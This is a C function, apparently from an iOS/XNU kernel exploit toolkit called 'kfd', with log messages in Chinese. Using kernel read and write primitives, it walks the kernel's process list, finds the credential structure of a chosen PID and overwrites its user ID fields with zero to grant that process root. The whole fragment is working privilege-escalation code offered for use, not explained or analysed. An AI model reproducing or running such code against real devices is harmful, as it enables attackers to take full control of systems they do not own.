int kfd_escalate_pid(pid_t pid) {
    if (!g_kfd_ready) {
        set_error("kfd not ready, cannot escalate PID %d", pid);
        return -1;
    }

    printf("[kfd] escalate_pid: 在 allproc 中查找 PID=%d ...\n", pid);

    uint64_t allproc_head = g_offs->allproc;
    uint64_t proc = 0;

    if (kread64(allproc_head, &proc) != 0) {
        set_error("无法读取 allproc 链表头");
        return -1;
    }

    uint64_t first_proc = proc;
    int iter = 0;
    while (proc != 0 && iter < 4096) {
        uint64_t next_proc = 0;
        kread64(proc + PROC_P_LIST_LE_NEXT, &next_proc);

        uint64_t pid_val = 0;
        if (kread64(proc + PROC_P_PID, &pid_val) == 0) {
            pid_t cur_pid = (pid_t)(uint32_t)pid_val;
            if (cur_pid == pid) {
                printf("[kfd] ✅ 找到目标进程 PID=%d, proc=0x%llx\n", pid, proc);
                uint64_t ucred = 0;
                if (kread64(proc + PROC_P_UCRED, &ucred) != 0) {
                    set_error("无法读取 PID %d 的 ucred", pid);
                    return -1;
                }
                printf("[kfd]    ucred=0x%llx\n", ucred);
                kwrite32(ucred + UCRED_CR_UID, 0);
                kwrite32(ucred + UCRED_CR_RUID, 0);
                kwrite32(ucred + UCRED_CR_SVUID, 0);
                kwrite32(ucred + 0x28, 0);

                uint64_t verify = 0xFF;
                kread64(ucred + UCRED_CR_UID, &verify);
                printf("[kfd]    验证: cr_uid=0x%llx\n", (unsigned long long)(verify & 0xFFFFFFFF));
                return ((verify & 0xFFFFFFFF) == 0) ? 0 : -1;
            }
        }

        if (next_proc == 0 || next_proc == first_proc) break;
        proc = next_proc;
        iter++;
    }

    set_error("未找到 PID=%d 的 proc 结构", pid);
    return -1;
}
